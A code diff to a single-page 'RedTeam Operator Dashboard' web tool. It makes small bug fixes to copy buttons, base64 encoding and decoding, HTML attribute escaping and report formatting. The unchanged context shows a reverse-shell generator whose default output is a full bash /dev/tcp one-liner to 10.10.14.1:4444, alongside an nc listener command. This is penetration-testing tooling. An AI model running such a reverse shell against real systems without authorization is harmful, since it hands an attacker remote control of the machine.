@@ -1131,8 +1131,8 @@
     <div class="info-label" style="margin-bottom:8px">Generated Reverse Shell</div>
     <div class="revshell-output" id="revshell-output">bash -i >& /dev/tcp/10.10.14.1/4444 0>&1</div>
     <div style="display:flex;gap:10px;margin-top:12px">
-      <button class="btn-copy" onclick="copyRevShell()">Copy Shell</button>
-      <button class="btn-copy" onclick="copyListener()">Copy Listener</button>
+      <button class="btn-copy" onclick="copyRevShell(this)">Copy Shell</button>
+      <button class="btn-copy" onclick="copyListener(this)">Copy Listener</button>
     </div>
   </div>
 </div>
@@ -1161,7 +1161,7 @@
         <div class="info-label" style="margin-bottom:6px">Output</div>
         <textarea class="tool-textarea" id="enc-output" placeholder="Result will appear here..." rows="6" readonly></textarea>
         <div class="tool-btn-row">
-          <button class="btn-copy" onclick="copyEncOutput()">Copy Output</button>
+          <button class="btn-copy" onclick="copyEncOutput(this)">Copy Output</button>
           <button class="btn-copy" onclick="swapEncFields()">↕ Swap</button>
         </div>
       </div>
@@ -1737,7 +1737,7 @@ function populateResults(parsed, intel = {}) {
         <div class="check-dot ${present ? 'present' : 'missing'}"></div>
         <div style="flex:1;font-family:'Share Tech Mono',monospace;font-size:12px">${h.name}</div>
         <span class="badge ${present ? 'badge-green' : 'badge-red'}">${present ? 'PRESENT' : 'MISSING'}</span>
-        ${present ? '<div style="font-size:10px;color:var(--text-dim);font-family:Share Tech Mono,monospace;margin-left:8px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="' + escapeHtml(val) + '">' + escapeHtml(val.substring(0,60)) + '</div>' : ''}
+        ${present ? '<div style="font-size:10px;color:var(--text-dim);font-family:Share Tech Mono,monospace;margin-left:8px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="' + escapeHtml(val).replace(/"/g,'&quot;') + '">' + escapeHtml(val.substring(0,60)) + '</div>' : ''}
       </div>`;
     }).join('') + '<div style="padding:8px 14px;font-size:11px;color:var(--text-dim);font-family:Share Tech Mono,monospace">Note: Headers reflect what was accessible via browser CORS fetch. Some headers may be filtered by the browser.</div>';
   } else {
@@ -1991,20 +1991,18 @@ function generateRevShell() {
   document.getElementById('revshell-listener').textContent = `nc -lvnp ${port}`;
 }
 
-function copyRevShell() {
+function copyRevShell(btn) {
   const text = document.getElementById('revshell-output').textContent;
   navigator.clipboard.writeText(text).then(() => {
-    const btn = event.currentTarget;
     btn.textContent = 'Copied!';
     btn.classList.add('copied');
     setTimeout(() => { btn.textContent = 'Copy Shell'; btn.classList.remove('copied'); }, 2000);
   });
 }
 
-function copyListener() {
+function copyListener(btn) {
   const text = document.getElementById('revshell-listener').textContent;
   navigator.clipboard.writeText(text).then(() => {
-    const btn = event.currentTarget;
     btn.textContent = 'Copied!';
     btn.classList.add('copied');
     setTimeout(() => { btn.textContent = 'Copy Listener'; btn.classList.remove('copied'); }, 2000);
@@ -2027,7 +2025,7 @@ function doEncode() {
   let output = '';
   try {
     switch (currentEncodingType) {
-      case 'base64': output = btoa(unescape(encodeURIComponent(input))); break;
+      case 'base64': output = btoa(Array.from(new TextEncoder().encode(input)).map(b => String.fromCharCode(b)).join('')); break;
       case 'url': output = encodeURIComponent(input); break;
       case 'html': output = input.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); break;
       case 'hex': output = Array.from(new TextEncoder().encode(input)).map(b => b.toString(16).padStart(2,'0')).join(' '); break;
@@ -2042,7 +2040,7 @@ function doDecode() {
   let output = '';
   try {
     switch (currentEncodingType) {
-      case 'base64': output = decodeURIComponent(escape(atob(input))); break;
+      case 'base64': { const bytes = atob(input); output = new TextDecoder().decode(new Uint8Array([...bytes].map(c => c.charCodeAt(0)))); break; }
       case 'url': output = decodeURIComponent(input); break;
       case 'html': {
         const el = document.createElement('textarea');
@@ -2057,10 +2055,9 @@ function doDecode() {
   document.getElementById('enc-output').value = output;
 }
 
-function copyEncOutput() {
+function copyEncOutput(btn) {
   const text = document.getElementById('enc-output').value;
   navigator.clipboard.writeText(text).then(() => {
-    const btn = event.currentTarget;
     btn.textContent = 'Copied!';
     btn.classList.add('copied');
     setTimeout(() => { btn.textContent = 'Copy Output'; btn.classList.remove('copied'); }, 2000);
@@ -2176,9 +2173,9 @@ function clearNotes() {
 function exportReport() {
   const intel = gatheredIntel;
   const lines = [];
-  lines.push('=' .repeat(60));
+  lines.push('='.repeat(60));
   lines.push('  REDTEAM OPERATOR DASHBOARD - INTELLIGENCE REPORT');
-  lines.push('=' .repeat(60));
+  lines.push('='.repeat(60));
   lines.push(`Generated: ${new Date().toISOString()}`);
   lines.push('');
 
@@ -2234,9 +2231,9 @@ function exportReport() {
     lines.push('');
   }
 
-  lines.push('=' .repeat(60));
+  lines.push('='.repeat(60));
   lines.push('  END OF REPORT');
-  lines.push('=' .repeat(60));
+  lines.push('='.repeat(60));
 
   const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
   const a = document.createElement('a');
